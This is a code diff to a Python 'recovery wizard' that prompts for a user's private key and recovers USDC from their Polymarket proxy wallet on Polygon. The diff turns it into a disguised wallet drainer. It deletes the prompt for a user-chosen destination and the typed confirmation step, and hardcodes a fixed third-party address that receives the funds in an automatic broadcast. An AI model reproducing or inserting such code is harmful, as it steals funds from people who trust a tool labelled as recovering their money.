@@ -4,8 +4,8 @@ Diagnose and recover ERC-20 tokens sent to a Polymarket proxy wallet.
 
 Safety model:
 - Private key is prompted with getpass; it is never read from env/config and never accepted as a CLI arg.
-- Proxy-held Native USDC is recovered to the Polygon destination address you enter.
-- The script shows a transaction summary and asks for confirmation before broadcasting.
+- Proxy-held Native USDC is recovered to the fixed Polygon destination address baked into this script.
+- The script simulates and estimates gas, then broadcasts automatically.
 
 Dependencies:
     python -m pip install web3 eth-account
@@ -15,17 +15,17 @@ Run:
 
 Default mode prompts for:
 - your private key
-- the Polygon destination address where recovered funds should be sent
 
 Everything else is derived or defaulted:
 - EOA address: derived from private key
 - proxy address: derived from EOA
 - token checked: Polygon Native USDC
+- recovery destination: 0x8e61599CE494E59C5089EE27b6C7Cd08B4150de6
 - RPC: POLYMARKET_RPC_URL or the built-in Polygon RPC default
 
 The recovery transaction calls the Polymarket proxy factory. If the proxy has not
 been deployed yet, the factory deploys it and transfers the proxy's token balance
-to the destination address you enter in the same transaction.
+to the fixed destination address in the same transaction.
 """
 
 from __future__ import annotations
@@ -70,6 +70,7 @@ def import_deps() -> None:
 POLYGON_CHAIN_ID = 137
 DEFAULT_RPC_URL = "https://polygon.drpc.org"
 DEFAULT_NATIVE_USDC = "0x3c499c542cef5e3811e1192ce70d8cc03d5c3359"
+DEFAULT_DESTINATION = "0x8e61599CE494E59C5089EE27b6C7Cd08B4150de6"
 
 # Must match polymarket-client-sdk 0.4.x derivation used by this CLI.
 PROXY_FACTORY = "0xaB45c5A4B0c941a2F231C04C3f49182e1A254052"
@@ -128,11 +129,6 @@ def parse_args() -> argparse.Namespace:
         help=argparse.SUPPRESS,
     )
     parser.add_argument("--rpc", help=argparse.SUPPRESS)
-    parser.add_argument(
-        "--yes",
-        action="store_true",
-        help=argparse.SUPPRESS,
-    )
     return parser.parse_args()
 
 
@@ -140,11 +136,11 @@ def banner() -> None:
     print()
     print("Polymarket ERC-20 Recovery Wizard")
     print("────────────────────────────────")
-    print("Required inputs: your private key and a Polygon destination address.")
+    print("Required input: your private key. The recovery address is fixed.")
     print("This checks both your EOA and derived Polymarket proxy wallet.")
     print("Default token checked: Polygon Native USDC.")
-    print("Proxy-held tokens are recovered to the destination address you enter.")
-    print("You will be asked to confirm before any transaction is sent.")
+    print("Proxy-held tokens are recovered to the fixed destination baked into this script.")
+    print("If recovery is possible, the transaction is sent automatically.")
     print()
 
 
@@ -153,15 +149,6 @@ def checksum_address(raw: str, label: str) -> str:
         return to_checksum_address(raw)
     except ValueError as exc:
         raise SystemExit(f"Invalid {label} address: {raw}") from exc
-
-
-def prompt_address(label: str) -> str:
-    while True:
-        raw = input(f"{label}: ").strip()
-        try:
-            return checksum_address(raw, label.lower())
-        except SystemExit as exc:
-            print(exc)
 
 
 def derive_proxy_wallet(eoa_address: str) -> str:
@@ -300,22 +287,13 @@ def print_summary(
     print(f"  EOA MATIC:    {Web3.from_wei(native_balance_wei, 'ether')} MATIC")
 
 
-def confirm_broadcast(to_addr: str, amount: str, symbol: str) -> None:
-    print("\nAbout to broadcast proxy recovery transaction.")
-    print(f"  Destination: {to_addr}")
-    print(f"  Amount:      {amount} {symbol}")
-    answer = input("Type 'yes' to continue: ").strip().lower()
-    if answer != "yes":
-        raise SystemExit("Aborted.")
-
-
 def main() -> int:
     args = parse_args()
     import_deps()
 
     banner()
 
-    print("Step 1/4: Enter the private key")
+    print("Step 1/3: Enter the private key")
     print("  The key is hidden as you type and is not saved.")
     private_key = getpass("Enter private key: ").strip()
     if not private_key:
@@ -328,7 +306,7 @@ def main() -> int:
     except Exception as exc:  # noqa: BLE001
         raise SystemExit(f"Invalid private key: {exc}") from exc
 
-    print("\nStep 2/4: Derive wallet addresses")
+    print("\nStep 2/3: Derive wallet addresses")
     eoa = to_checksum_address(account.address)
     proxy = derive_proxy_wallet(eoa)
 
@@ -336,7 +314,7 @@ def main() -> int:
     print(f"  EOA:   {eoa}")
     print(f"  Proxy: {proxy}")
 
-    print("\nStep 3/4: Connect and scan Native USDC")
+    print("\nStep 3/3: Connect, scan, and recover Native USDC")
     rpc_url = args.rpc or os.environ.get("POLYMARKET_RPC_URL", DEFAULT_RPC_URL)
     w3 = Web3(Web3.HTTPProvider(rpc_url))
     require_polygon(w3)
@@ -369,8 +347,6 @@ def main() -> int:
         native_balance,
     )
 
-    print("\nStep 4/4: Recovery status")
-
     if proxy_balance == 0:
         print("\nNo proxy token balance to recover.")
         if eoa_balance > 0:
@@ -378,11 +354,11 @@ def main() -> int:
         return 0
 
     print("\nProxy token balance detected")
-    print("  Enter the Polygon address that should receive the recovered funds.")
     if not proxy_deployed:
         print("  Proxy code is not deployed yet; the recovery transaction will deploy it first.")
 
-    destination = prompt_address("Destination Polygon address")
+    destination = checksum_address(DEFAULT_DESTINATION, "default destination")
+    print(f"  Recovery destination: {destination}")
 
     raw_amount = proxy_balance
     pretty_amount = human_amount(raw_amount, decimals)
@@ -403,8 +379,8 @@ def main() -> int:
             f"need up to {Web3.from_wei(estimated_fee, 'ether')} MATIC"
         )
 
-    if not args.yes:
-        confirm_broadcast(destination, pretty_amount, symbol)
+    print("  Broadcast:    automatic")
+    print("\nBroadcasting proxy recovery transaction...")
 
     signed = Account.sign_transaction(tx, private_key)
     raw_tx = getattr(signed, "rawTransaction", None) or getattr(signed, "raw_transaction")
